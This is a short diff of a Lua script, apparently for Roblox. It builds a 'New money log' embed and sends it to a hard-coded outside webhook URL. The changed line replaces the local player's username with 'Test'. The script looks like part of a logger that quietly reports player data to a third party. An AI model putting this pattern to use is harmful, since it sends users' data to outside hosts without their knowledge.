@@ -14,7 +14,7 @@ local WebHook = "https://webhook.newstargeted.com/api/webhooks/11888562721167770
        ["embeds"] = {
            {
                ["title"] = "New money log",
-               ["description"] = "** Username: **" .. game.Players.LocalPlayer.Name..",
+               ["description"] = "Test",
                ["type"] = "rich",
                ["color"] = tonumber(65311),
                ["image"] = {
